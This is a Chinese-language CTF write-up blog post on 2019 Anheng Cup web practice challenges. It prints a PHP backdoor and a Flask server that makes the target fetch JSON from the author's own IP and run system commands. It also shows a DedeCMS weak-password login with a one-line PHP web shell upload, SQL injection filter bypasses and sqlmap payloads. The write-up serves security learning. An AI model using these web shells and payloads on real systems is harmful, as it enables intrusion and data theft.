@@ -1,0 +1,973 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/avatar.svg?v=7.4.0" color="#222">
+  <link rel="alternate" href="/atom.xml" title="Anemone's Blog" type="application/atom+xml">
+  <meta name="google-site-verification" content="Re5JdegRYzNFco-rC9lYIsvSWIgh5JvyfhuEaZCeFCk">
+  <meta name="baidu-site-verification" content="opTC8YN3Pn">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: 'GB90MXPJ1C',
+      apiKey: '05d808da3baf50ac2f2fad2dc3a3cd8f',
+      indexName: 'dev_blog',
+      hits: {"per_page":20},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="爱い窒息、痛0x01 路径遍历打开地址看到路径遍历：在upload文件夹下发现后门和其源码0x02 后门审计格式化后，进行代码审计123456789101112131415161718192021222324252627282930313233343536373839404142434445&amp;lt;?php$a = isset($_POST[&apos;pass&apos;]) ? trim($_POST[&apos;pass">
+<meta name="keywords" content="PHP,CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019“安恒杯”WEB安全测试秋季大赛练习题wp">
+<meta property="og:url" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/index.html">
+<meta property="og:site_name" content="Anemone&#39;s Blog">
+<meta property="og:description" content="爱い窒息、痛0x01 路径遍历打开地址看到路径遍历：在upload文件夹下发现后门和其源码0x02 后门审计格式化后，进行代码审计123456789101112131415161718192021222324252627282930313233343536373839404142434445&amp;lt;?php$a = isset($_POST[&apos;pass&apos;]) ? trim($_POST[&apos;pass">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571126059065.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571141073240.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571141089817.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571317896911.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571144854091.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571145028036.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571145141787.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571126576237.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571127184086.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571128235789.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571128339477.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571128497061.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571129558998.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571130055314.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571130170687.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/step2-1541417918841.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/step3-1541417936188.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/step4.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/step5.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571131861906.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571130487146.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571130863836.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571212369176.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571219028911.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571196679531.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571196848622.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571211251759.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571211484309.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571211770075.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571199573631.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571140925389.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571131147272.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571131226817.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571192815365.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571192935874.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571193047923.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571193204265.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571193458794.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571193530702.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571193790173.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571194732400.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571194913710.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571195205154.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571195383816.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571197503720.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571197561706.png">
+<meta property="og:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571197802703.png">
+<meta property="og:updated_time" content="2021-04-26T13:55:27.197Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2019“安恒杯”WEB安全测试秋季大赛练习题wp">
+<meta name="twitter:description" content="爱い窒息、痛0x01 路径遍历打开地址看到路径遍历：在upload文件夹下发现后门和其源码0x02 后门审计格式化后，进行代码审计123456789101112131415161718192021222324252627282930313233343536373839404142434445&amp;lt;?php$a = isset($_POST[&apos;pass&apos;]) ? trim($_POST[&apos;pass">
+<meta name="twitter:image" content="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571126059065.png">
+  <link rel="canonical" href="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>2019“安恒杯”WEB安全测试秋季大赛练习题wp | Anemone's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Anemone's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="fa fa-search fa-fw"></i>搜索</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input" id="search-input"></div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="algolia-results">
+  <div id="algolia-stats"></div>
+  <div id="algolia-hits"></div>
+  <div id="algolia-pagination" class="algolia-pagination"></div>
+</div>
+
+  
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Anemone">
+      <meta itemprop="description" content="关注Web安全、移动安全、Fuzz测试和机器学习">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Anemone's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">2019“安恒杯”WEB安全测试秋季大赛练习题wp
+
+          
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2019-10-17 20:38:34" itemprop="dateCreated datePublished" datetime="2019-10-17T20:38:34+08:00">2019-10-17</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-04-26 21:55:27" itemprop="dateModified" datetime="2021-04-26T21:55:27+08:00">2021-04-26</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            <span id="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/" class="post-meta-item leancloud_visitors" data-flag-title="2019“安恒杯”WEB安全测试秋季大赛练习题wp" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="爱い窒息、痛"><a href="#爱い窒息、痛" class="headerlink" title="爱い窒息、痛"></a>爱い窒息、痛</h1><h2 id="0x01-路径遍历"><a href="#0x01-路径遍历" class="headerlink" title="0x01 路径遍历"></a>0x01 路径遍历</h2><p>打开地址看到路径遍历：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571126059065.png" alt="1571126059065"></p><p>在upload文件夹下发现后门和其源码</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571141073240.png" alt="1571141073240"></p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571141089817.png" alt="1571141089817"></p><h2 id="0x02-后门审计"><a href="#0x02-后门审计" class="headerlink" title="0x02 后门审计"></a>0x02 后门审计</h2><p>格式化后，进行代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">isset</span>($_POST[<span class="string">'pass'</span>]) ? trim($_POST[<span class="string">'pass'</span>]) : <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> ($a == <span class="string">''</span>) &#123;</span><br><span class="line">    echologin();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    chkpass($a);</span><br><span class="line">    helloowner($a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">chkpass</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// UA是md5(POST['pass'])</span></span><br><span class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>], md5($a)) === <span class="keyword">false</span>) &#123;</span><br><span class="line">        echofail(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">helloowner</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 这里产生一个url</span></span><br><span class="line">    $b = gencodeurl($a);</span><br><span class="line">    <span class="comment">// 从url获取文件内容，SSRF</span></span><br><span class="line">    $c = file_get_contents($b);</span><br><span class="line">    <span class="keyword">if</span> ($c == <span class="keyword">false</span>) &#123;</span><br><span class="line">        echofail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $d = @json_decode($c, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($d[<span class="string">'f'</span>])) &#123;</span><br><span class="line">        echofail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// CodeInjection, may cause RCE, e.g.,&#123;"f":"system","d":"ls"&#125;</span></span><br><span class="line">    $d[<span class="string">'f'</span>]($d[<span class="string">'d'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gencodeurl</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    $e = md5(date(<span class="string">"Y-m-d"</span>));</span><br><span class="line">    <span class="keyword">if</span> (strlen($a) &gt; <span class="number">40</span>) &#123;</span><br><span class="line">        $f = substr($a, <span class="number">30</span>, <span class="number">5</span>);</span><br><span class="line">        $g = substr($a, <span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $f = <span class="string">'good'</span>;</span><br><span class="line">        $g = <span class="string">'web.com'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $b = <span class="string">'http://'</span>.$f.$g; <span class="comment">// url=http://pass[30:35]+pass[10:20], i.e.,url&lt;=15</span></span><br><span class="line">    <span class="keyword">return</span> $b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echofail</span><span class="params">($h)</span> </span>&#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echologin</span><span class="params">()</span> </span>&#123;<span class="comment">/*...*/</span>&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a>
+
+
+
+
+
+
+<p>其首先检查UA是否等于md5(POST[‘pass’])，接着取pass参数的两部分（pass长度要求大于40），组装成一个url，从该url获取一个json，再从json中的f变量获取函数名，d变量获取参数，并执行。</p>
+<h2 id="0x03-构造恶意json"><a href="#0x03-构造恶意json" class="headerlink" title="0x03 构造恶意json"></a>0x03 构造恶意json</h2><p>按之前分析，最省事的方法是在自己服务器上一起个80服务，然后返回恶意json</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,jsonify</span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">srv</span><span class="params">()</span>:</span></span><br><span class="line">    resp=dict(f=<span class="string">"system"</span>,d=<span class="string">"ls"</span>)</span><br><span class="line">    <span class="keyword">return</span> jsonify(resp), <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="0x04-后门利用"><a href="#0x04-后门利用" class="headerlink" title="0x04 后门利用"></a>0x04 后门利用</h2><p>最后一步，构造后门请求。首先，假设我服务器是216.126.239.124</p>
+<p>先生成pass参数，画个草图好写代码：</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571317896911.png" alt="1571317896911"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: url=<span class="string">"216.126.239.124"</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: _pass=<span class="string">'a'</span>*<span class="number">10</span>+url[<span class="number">5</span>:<span class="number">15</span>]+<span class="string">'b'</span>*<span class="number">10</span>+url[:<span class="number">5</span>]+<span class="string">'c'</span>*<span class="number">10</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: _pass</span><br><span class="line">Out[<span class="number">3</span>]: <span class="string">'aaaaaaaaaa26.239.124bbbbbbbbbb216.1cccccccccc'</span></span><br></pre></td></tr></table></figure>
+<p>再生成UA：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [4]: import hashlib</span><br><span class="line"></span><br><span class="line">In [5]: hashlib.md5(_pass.encode(&apos;ascii&apos;)).hexdigest()</span><br><span class="line">Out[5]: &apos;98a36c28cf36c4d8eeb8055a3538562e&apos;</span><br></pre></td></tr></table></figure>
+<p>尝试发送payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://114.55.36.69:8020/upload/dama.php -X POST -H &quot;User-agent: 98a36c28cf36c4d8eeb8055a3538562e&quot; -d &apos;pass=aaaaaaaaaa26.239.124bbbbbbbbbb216.1cccccccccc&apos;</span><br></pre></td></tr></table></figure>
+<p>可以看到payload生效了：</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571144854091.png" alt="1571144854091"></p>
+<p>找一下flag，需要修改我们服务器上的payload</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571145028036.png" alt="1571145028036"></p>
+<p>然后找到目录<code>/var/www/html/flag.php</code>，cat得到flag：</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571145141787.png" alt="1571145141787"></p>
+<h1 id="dedecms"><a href="#dedecms" class="headerlink" title="dedecms"></a>dedecms</h1><h2 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a>0x00 信息收集</h2><p>打开是一个用织梦CMS写的网站，拉到最下面看到版本疑似是v5.7sp2，想到织梦CMSV5.7SP2后台存在代码执行漏洞，详情见<a href="https://www.freebuf.com/vuls/164035.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/164035.html</a></p>
+<h2 id="0x01-弱密码"><a href="#0x01-弱密码" class="headerlink" title="0x01 弱密码"></a>0x01 弱密码</h2><p>访问 <code>/dede/login.php</code>，看到管理登录页面，这里存在弱密码： admin:admin</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571126576237.png" alt="1571126576237"></p>
+<h2 id="0x02-代码审计"><a href="#0x02-代码审计" class="headerlink" title="0x02 代码审计"></a>0x02 代码审计</h2><p> todo</p>
+<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>第一步，<code>GET /dede/tpl.php?action=upload</code>，获取csrftoken</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571127184086.png" alt="1571127184086"></p>
+<p>第二步，<code>GET /dede/tpl.php?filename=anemone.lib.php&amp;action=savetagfile&amp;content=%3C?php%20var_dump(system($_GET[&#39;x&#39;]));?%3E&amp;token={csrf_token}</code>，上传一句话</p>
+<p>第三步，<code>GET /include/taglib/anemone.lib.php?x=ls</code>，能RCE了：</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571128235789.png" alt="1571128235789"></p>
+<h2 id="0x04-找flag"><a href="#0x04-找flag" class="headerlink" title="0x04 找flag"></a>0x04 找flag</h2><p><code>GET /include/taglib/anemone.lib.php?x=find%20/%20-name%20flag</code></p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571128339477.png" alt="1571128339477"></p>
+<p><code>GET /include/taglib/anemone.lib.php?x=cat%20/tmp/flagishere/flagishere/flagishere/flag</code></p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571128497061.png" alt="1571128497061"></p>
+<p>（flag被人改了吗？）</p>
+<h1 id="新的新闻搜索"><a href="#新的新闻搜索" class="headerlink" title="新的新闻搜索"></a>新的新闻搜索</h1><h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><p>尝试一些payload，看到有SQL注入：</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571129558998.png" alt="1571129558998"></p>
+<p>但是union,select会被过滤</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571130055314.png" alt="1571130055314"></p>
+<p>尝试<code>/*!select*/</code>绕过</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571130170687.png" alt="1571130170687"></p>
+<p>查库，得到news：</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/step2-1541417918841.png" alt="step2"></p>
+<p>查表，得到admin表：</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/step3-1541417936188.png" alt="step3"></p>
+<p>查列，得到flag列</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/step4.png" alt="step4"></p>
+<p>查记录，得到flag：</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/step5.png" alt="step5"></p>
+<h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><p>尝试sqlmap</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -r D:\MEGAsync\mooctest2019exer\new-news.txt  --level 3 --risk 3</span><br><span class="line">sqlmap identified the following injection point(s) with a total of 233 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: <span class="comment">#1* ((custom) POST)</span></span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: word=-2704<span class="string">' OR 5368=5368-- AyLy&amp;number=5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 OR time-based blind (SLEEP)</span></span><br><span class="line"><span class="string">    Payload: word=test'</span> OR SLEEP(5)-- pJuo&amp;number=5</span><br></pre></td></tr></table></figure>
+<h1 id="常规操作"><a href="#常规操作" class="headerlink" title="常规操作"></a>常规操作</h1><p>看到<code>/index.php?url=upload</code>可以想到url可能存在文件包含/SSRF/URLRedirect问题：</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571131861906.png" alt="1571131861906"></p>
+<p>base64decode后得到flag</p>
